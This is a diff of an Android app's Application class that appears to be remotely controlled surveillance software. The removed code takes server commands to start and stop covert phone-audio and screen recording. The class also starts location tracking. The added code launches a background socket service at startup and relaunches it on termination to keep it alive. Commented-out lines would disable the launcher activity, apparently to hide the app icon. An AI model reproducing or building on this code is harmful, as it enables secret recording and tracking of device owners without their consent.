@@ -1,22 +1,17 @@
 package com.view.core;
 
 import android.app.Application;
+import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.ServiceConnection;
-import android.os.Bundle;
 import android.os.Handler;
-import android.os.RemoteException;
+import android.os.IBinder;
 import android.util.Log;
-import android.widget.Toast;
 
-import com.view.core.activitys.MainActivity;
 import com.view.core.activitys.PhoneRecordActivity;
-import com.view.core.activitys.ScreenRecordActivity;
-import com.view.core.services.ScreenUtil;
+import com.view.core.services.SocketService;
 import com.view.core.thread.ClientThread;
-import com.view.core.thread.Constant;
-import com.view.core.thread.OnClientListener;
 import com.view.core.utils.LocationUtil;
 
 /**
@@ -28,36 +23,82 @@ import com.view.core.utils.LocationUtil;
  **/
 public class MyApplication extends Application {
 
-    private static final String TAG = MyApplication.class.getSimpleName();
+//    private static final String TAG = MyApplication.class.getSimpleName();
+    private static final String TAG = SocketService.class.getSimpleName();
 
-    private Context mContext ;
+    private static Context mContext ;
     private Handler mHandler = new Handler();
     private ClientThread mClientThread = null;
     private PhoneRecordActivity.PhoneServiceConnection mPhoneServiceConnection;
     private ServiceConnection mScreenServiceConnection;
 
+    private Intent mSocketIntent = null;
+
     @Override
     public void onCreate() {
         super.onCreate();
+        Log.d(TAG, "onCreate: executed");
         mContext = this;
 //        PackageManager pm = getPackageManager();
 //        ComponentName component = new ComponentName(getApplicationContext(), MainActivity.class);
 //        pm.setComponentEnabledSetting(component, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
 //                PackageManager.DONT_KILL_APP);
+        String process = getProcessName();
+        Log.d(TAG, "onCreate: process name="+ process);
+        if(process!=null && !process.endsWith("keepLife")) {
+            LocationUtil.getInstance().initLocationManager(this);
 
-        LocationUtil.getInstance().initLocationManager(this);
-
-        if(mClientThread == null) {
-            mClientThread = new ClientThread(this, mHandler, mListener);
-            mClientThread.start();
+            startSocketService();
         }
     }
 
-    public ClientThread getRemoteClient(){
-        if(mClientThread == null){
-            mClientThread = new ClientThread(this, mHandler, mListener);
-            mClientThread.start();
+    public static Context getContext(){
+        return mContext;
+    }
+
+    private void startSocketService(){
+        Log.d(TAG, "startSocketService: executed "+ android.os.Process.myPid());
+        if(mSocketIntent == null) {
+            mSocketIntent = new Intent();
+            mSocketIntent.setClass(this, SocketService.class);
+            mSocketIntent.setPackage(getPackageName());
+            mSocketIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+//            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+//                startForegroundService(mSocketIntent);
+//            } else {
+//                startService(mSocketIntent);
+//            }
+            startService(mSocketIntent);
+            Log.d(TAG, "startSocketService: start success!");
         }
+//        bindService(mSocketIntent, mSocketConnection, Context.BIND_AUTO_CREATE);
+    }
+
+    private void stopSocketService(){
+        if(mSocketIntent != null){
+            Log.d(TAG, "stopSocketService: stop success");
+            stopService(mSocketIntent);
+            mSocketIntent = null;
+        }
+    }
+
+    private static ServiceConnection mSocketConnection = new ServiceConnection() {
+        @Override
+        public void onServiceConnected(ComponentName name, IBinder service) {
+            Log.d(TAG, "onServiceConnected: "+ name);
+        }
+
+        @Override
+        public void onServiceDisconnected(ComponentName name) {
+            Log.d(TAG, "onServiceDisconnected: "+ name);
+        }
+    };
+
+    public static ServiceConnection getSocketConnection(){
+        return mSocketConnection;
+    };
+
+    public ClientThread getRemoteClient(){
         return mClientThread;
     }
 
@@ -77,122 +118,23 @@ public class MyApplication extends Application {
         return mScreenServiceConnection;
     }
 
-    private OnClientListener mListener = new OnClientListener() {
-
-        @Override
-        public void onStartConnect() {
-        }
-
-        @Override
-        public void onConnected(final String host, final int ip) {
-            if(Constant.isDebug) {
-                mHandler.post(new Runnable() {
-                    @Override
-                    public void run() {
-                        Toast.makeText(mContext, ("服务器，" + host), Toast.LENGTH_SHORT).show();
-                    }
-                });
-            }
-        }
-
-        @Override
-        public void onAuthenticateFailed() {
-
-        }
-
-        @Override
-        public void onAuthenticateSuccess() {
-
-        }
-
-        @Override
-        public void onCommand(String cmd, String json) {
-            Log.d(TAG, "onCommand: cmd="+ cmd+ ", json="+ json);
-            if(cmd.equals(Constant.CMD_FETCH_REMOTE_DEVICE)){
-                Intent intent = new Intent();
-                intent.setClass(mContext, MainActivity.class);
-                intent.setPackage(getPackageName());
-                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                Bundle bundle = new Bundle();
-                bundle.putString(Constant.KEY_HOSTNAME, json);
-                intent.putExtra("data", bundle);
-                startActivity(intent);
-            }else if(cmd.equals(Constant.CMD_STOP_REMOTE_OPERA)){
-                if(mPhoneServiceConnection != null){
-                    unbindService(mPhoneServiceConnection);
-                }
-                if(mScreenServiceConnection != null){
-                    unbindService(mScreenServiceConnection);
-                }
-
-
-            /**
-             * 开启录音
-              */
-            }else if(cmd.equals(Constant.CMD_FETCH_REMOTE_PHONE)){
-                Intent intent = new Intent();
-                intent.setClass(mContext, PhoneRecordActivity.class);
-                intent.setPackage(getPackageName());
-                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                Bundle bundle = new Bundle();
-                bundle.putString(Constant.KEY_HOSTNAME, json);
-                intent.putExtra("data", bundle);
-                startActivity(intent);
-            }else if(cmd.equals(Constant.CMD_STOP_REMOTE_PHONE)){
-                if(mPhoneServiceConnection != null){
-                    Log.d(TAG, "onCommand: unbindservice");
-                    try {
-                        if(Constant.isDebug){
-                            mHandler.post(new Runnable() {
-                                @Override
-                                public void run() {
-                                    Toast.makeText(mContext, "收到停止录音指令", Toast.LENGTH_SHORT).show();
-                                }
-                            });
-                        }
-                        mPhoneServiceConnection.record.stopRecord();
-                    } catch (RemoteException e) {
-                        e.printStackTrace();
-                    }
-                }
-
-
-
-            /**
-             * 开启录屏
-             */
-            }else if(cmd.equals(Constant.CMD_FETCH_REMOTE_SCREEN)){
-                Intent intent = new Intent();
-                intent.setClass(mContext, ScreenRecordActivity.class);
-                intent.setPackage(getPackageName());
-                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                Bundle bundle = new Bundle();
-                bundle.putString(Constant.KEY_HOSTNAME, json);
-                intent.putExtra("data", bundle);
-                startActivity(intent);
-            }else if(cmd.equals(Constant.CMD_STOP_REMOTE_SCREEN)){
-                if(mScreenServiceConnection != null){
-                    Log.d(TAG, "onCommand: unbindservice");
-                    ScreenUtil.stopScreenRecord(mContext);
-                }
-            }
-        }
-
-        @Override
-        public void onConnectionFailed(String message) {
-
-        }
-
-        @Override
-        public void onError(int errCode, String errMessage) {
-
-        }
-    };
-
     @Override
     public void onTerminate(){
         super.onTerminate();
+        Log.d(TAG, "onTerminate: executed");
         LocationUtil.getInstance().destoryLocationManager();
+        startSocketService();
     }
 
+    @Override
+    public void onTrimMemory(int level) {
+        super.onTrimMemory(level);
+        Log.d(TAG, "onTrimMemory: executed");
+    }
+
+    @Override
+    public void onLowMemory() {
+        super.onLowMemory();
+        Log.d(TAG, "onLowMemory: executed");
+    }
 }
